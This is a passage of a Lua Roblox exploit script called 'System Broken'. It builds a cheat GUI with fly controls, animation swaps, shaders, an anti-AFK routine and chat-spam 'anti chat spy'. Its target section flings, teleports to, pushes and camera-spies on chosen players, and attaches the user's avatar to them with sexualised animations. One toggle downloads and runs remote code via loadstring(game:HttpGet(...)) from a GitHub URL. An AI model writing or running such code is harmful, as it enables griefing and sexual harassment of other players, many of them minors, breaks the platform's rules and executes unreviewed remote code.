			elseif key:lower() == "d" then
				ctrl.r = 0
				PlayAnim(10714347256,4,0)
			end
		end)
		Fly()
	else
		flying = false
		Fly_Pad.Visible = false
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		StopAnim()
	end
end)

FlyAButton.MouseButton1Down:Connect(function()
	keypress("0x41")
end)
FlyAButton.MouseButton1Up:Connect(function ()
	keyrelease("0x41")
end)

FlySButton.MouseButton1Down:Connect(function()
	keypress("0x53")
end)
FlySButton.MouseButton1Up:Connect(function ()
	keyrelease("0x53")
end)

FlyDButton.MouseButton1Down:Connect(function()
	keypress("0x44")
end)
FlyDButton.MouseButton1Up:Connect(function ()
	keyrelease("0x44")
end)

FlyWButton.MouseButton1Down:Connect(function()
	keypress("0x57")
end)
FlyWButton.MouseButton1Up:Connect(function ()
	keyrelease("0x57")
end)

--TARGET
ClickTargetTool_Button.MouseButton1Click:Connect(function()
	local GetTargetTool = Instance.new("Tool")
	GetTargetTool.Name = "ClickTarget"
	GetTargetTool.RequiresHandle = false
	GetTargetTool.TextureId = "rbxassetid://2716591855"
	GetTargetTool.ToolTip = "Select Target"

	local function ActivateTool()
		local root = GetRoot(plr)
		local hit = mouse.Target
		local person = nil
		if hit and hit.Parent then
			if hit.Parent:IsA("Model") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent)
			elseif hit.Parent:IsA("Accessory") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent.Parent)
			end
			if person then
				UpdateTarget(person)
			end
		end
	end

	GetTargetTool.Activated:Connect(function()
		ActivateTool()
	end)
	GetTargetTool.Parent = plr.Backpack
end)

FlingTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(FlingTarget_Button)
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			if TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
				ChangeToggleColor(TouchFling_Button)
			end
			local OldPos = GetRoot(plr).Position
			ToggleFling(true)
			repeat task.wait()
				pcall(function()
					PredictionTP(Players[TargetedPlayer],"safe")
				end)
				task.wait()
			until FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			TeleportTO(OldPos.X,OldPos.Y,OldPos.Z,"pos","safe")
		else
			ToggleFling(false)
		end
	end
end)

ViewTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(ViewTarget_Button)
		if ViewTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					game.Workspace.CurrentCamera.CameraSubject = Players[TargetedPlayer].Character.Humanoid
				end)
				task.wait(0.5)
			until ViewTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			game.Workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
		end
	end
end)

FocusTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(FocusTarget_Button)
		if FocusTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					local target = Players[TargetedPlayer]
					TeleportTO(0,0,0,target)
					Push(Players[TargetedPlayer])
				end)
				task.wait(0.2)
			until FocusTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
		end
	end
end)

BenxTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(BenxTarget_Button)
		if BenxTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(5918726674,0,1)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local otherRoot = GetRoot(Players[TargetedPlayer])
					GetRoot(plr).CFrame = otherRoot.CFrame * CFrame.new(0,0,1.1)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until BenxTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

HeadsitTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(HeadsitTarget_Button)
		if HeadsitTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local targethead = Players[TargetedPlayer].Character.Head
					plr.Character.Humanoid.Sit = true
					GetRoot(plr).CFrame = targethead.CFrame * CFrame.new(0,2,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until HeadsitTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

StandTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(StandTarget_Button)
		if StandTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(13823324057,4,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = GetRoot(Players[TargetedPlayer])
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(-3,1,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until StandTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

BackpackTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(BackpackTarget_Button)
		if BackpackTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = GetRoot(Players[TargetedPlayer])
					plr.Character.Humanoid.Sit = true
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,0,1.2) * CFrame.Angles(0, -3, 0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until BackpackTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

DoggyTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(DoggyTarget_Button)
		if DoggyTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(13694096724,3.4,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = Players[TargetedPlayer].Character.LowerTorso
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,0.23,0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until DoggyTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

DragTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		ChangeToggleColor(DragTarget_Button)
		if DragTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			PlayAnim(10714360343,0.5,0)
			repeat
				pcall(function()
					if not GetRoot(plr):FindFirstChild("BreakVelocity") then
						pcall(function()
							local TempV = Velocity_Asset:Clone()
							TempV.Parent = GetRoot(plr)
						end)
					end
					local root = Players[TargetedPlayer].Character.RightHand
					GetRoot(plr).CFrame = root.CFrame * CFrame.new(0,-2.5,1) * CFrame.Angles(-2, -3, 0)
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
				end)
				task.wait()
			until DragTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
			StopAnim()
			if GetRoot(plr):FindFirstChild("BreakVelocity") then
				GetRoot(plr).BreakVelocity:Destroy()
			end
		end
	end
end)

PushTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		local pushpos = GetRoot(plr).CFrame
		PredictionTP(Players[TargetedPlayer])
		task.wait(GetPing()+0.05)
		Push(Players[TargetedPlayer])
		GetRoot(plr).CFrame = pushpos
	end
end)

TeleportTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		TeleportTO(0,0,0,Players[TargetedPlayer],"safe")
	end
end)

WhitelistTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		if table.find(ScriptWhitelist, Players[TargetedPlayer].UserId) then
			for i,v in pairs(ScriptWhitelist) do
				if v == Players[TargetedPlayer].UserId then
					table.remove(ScriptWhitelist, i)
				end
			end
			SendNotify("System Broken",TargetedPlayer.." removed from whitelist.",5)
		else
			table.insert(ScriptWhitelist, Players[TargetedPlayer].UserId)
			SendNotify("System Broken",TargetedPlayer.." added to whitelist.", 5)
		end
	end
end)

TargetName_Input.FocusLost:Connect(function()
	local LabelText = TargetName_Input.Text
	local LabelTarget = GetPlayer(LabelText)
	UpdateTarget(LabelTarget)
end)

--ANIMATIONS

VampireAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

HeroAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ZombieClassicAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

MageAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

GhostAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ElderAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

LevitationAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

AstronautAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

NinjaAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

WerewolfAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

CartoonAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PirateAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

SneakyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
    Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
    Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
    Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
    Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
    Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
    Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ToyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

KnightAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

--NEWS
ConfidentAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PopstarAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PrincessAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

CowboyAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

PatrolAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1150944216"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

ZombieFEAnim_Button.MouseButton1Click:Connect(function()
	local Animate = plr.Character.Animate
	Animate.Disabled = true
	StopAnim()
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3489174223"
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3489173414"
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
	Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
	plr.Character.Humanoid:ChangeState(3)
	Animate.Disabled = false
end)

--MISC

pcall(function()
	aBjaUfk.Position = plr.Character.HumanoidRootPart.Position
end)

AntiFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiFling_Button)
	if AntiFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		_G.AntiFlingToggled = true
		loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/AntiFling'))()
	else
		_G.AntiFlingToggled = false
	end
end)

AntiChatSpy_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiChatSpy_Button)
	if AntiChatSpy_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		repeat task.wait()
			Players:Chat(RandomChar())
		until AntiChatSpy_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
	end
end)

local AntiAFKFunction = nil
AntiAFK_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiAFK_Button)
	if AntiAFK_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiAFKFunction = plr.Idled:Connect(function()
			local VirtualUser = game:GetService("VirtualUser")
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	else
		AntiAFKFunction:Disconnect()
	end
end)

Shaders_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(Shaders_Button)
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		local Sky = Instance.new("Sky")
		local Bloom = Instance.new("BloomEffect")
		local Blur = Instance.new("BlurEffect")
		local ColorC = Instance.new("ColorCorrectionEffect")
		local SunRays = Instance.new("SunRaysEffect")

		Light.Brightness = 2.25
		Light.ExposureCompensation = 0.1
		Light.ClockTime = 17.55

		Sky.SkyboxBk = "http://www.roblox.com/asset/?id=144933338"
		Sky.SkyboxDn = "http://www.roblox.com/asset/?id=144931530"
		Sky.SkyboxFt = "http://www.roblox.com/asset/?id=144933262"
		Sky.SkyboxLf = "http://www.roblox.com/asset/?id=144933244"
		Sky.SkyboxRt = "http://www.roblox.com/asset/?id=144933299"
		Sky.SkyboxUp = "http://www.roblox.com/asset/?id=144931564"
		Sky.StarCount = 5000
		Sky.SunAngularSize = 5
		Sky.Parent = Light

		Bloom.Intensity = 0.3
		Bloom.Size = 10
		Bloom.Threshold = 0.8
		Bloom.Parent = Light

		Blur.Size = 5
		Blur.Parent = Light

		ColorC.Brightness = 0
		ColorC.Contrast = 0.1
		ColorC.Saturation = 0.25
		ColorC.TintColor = Color3.fromRGB(255, 255, 255)
		ColorC.Parent = Light

		SunRays.Intensity = 0.1
		SunRays.Spread = 0.8
		SunRays.Parent = Light
	else
		for i,v in pairs(Light:GetChildren()) do
			v:Destroy()
		end
		Light.Brightness = 2
		Light.ExposureCompensation = 0
	end
end)

Day_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		game:GetService("Lighting").ClockTime = 14
	else
		SendNotify("System Broken","Please turn off shaders.",5)
	end
end)

Night_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		game:GetService("Lighting").ClockTime = 19
